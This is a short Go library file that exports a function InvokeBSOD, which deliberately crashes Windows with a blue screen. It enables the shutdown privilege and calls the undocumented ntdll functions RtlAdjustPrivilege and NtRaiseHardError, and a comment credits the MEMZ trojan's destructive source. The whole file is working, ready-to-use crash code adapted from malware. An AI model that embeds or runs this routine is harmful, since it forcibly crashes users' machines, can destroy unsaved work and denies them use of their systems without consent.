package golibmagic

import (
	"errors"
	"runtime"
	"syscall"
	"unsafe"
)

var (
	ErrNotWindows = errors.New("golibmagic: computer is not running Microsoft Windows")
	ErrFailedBSOD = errors.New("golibmagic: failed to induce a BSOD on computer")
)

var (
	// ntdll represents the Windows Library "ntdll.dll"
	ntdll = syscall.NewLazyDLL("ntdll.dll")
	// RtlAdjustPrivilege is an undocumented Windows API function required for invoking a BSOD
	RtlAdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
	// NtRaiseHardError is an undocumented Windows API function required for invoking a BSOD
	NtRaiseHardError = ntdll.NewProc("NtRaiseHardError")
)

var (
	// NtErrorCode represents the BSOD error code
	NtErrorCode = 0xc0000022
	tempBool    bool
	tempString  string
)

/*
InvokeBSOD attempts to induce a BSOD on a computers running Microsoft Windows using undocumented functions within the Windows API.
The function shouldn't ever return an error, unless it failed in invoking a BSOD on the running system.
*/
func InvokeBSOD() error {
	// Check if computer is running Microsoft Windows
	if runtime.GOOS == "windows" {
		/*
		 Try forcing BSOD using undocumentated functions from Windows API
		 Credit to MEMZ: https://github.com/Leurak/MEMZ/blob/9f09ca4ae78b1e024c35a912a3dcebd8705d259d/WindowsTrojan/Source/Destructive/KillWindows.c#L10-L18
		*/
		RtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(&tempBool)))
		NtRaiseHardError.Call(uintptr(NtErrorCode), 0, 0, 0, 6, uintptr(unsafe.Pointer(&tempString)))
		return ErrFailedBSOD
	}
	return ErrNotWindows
}
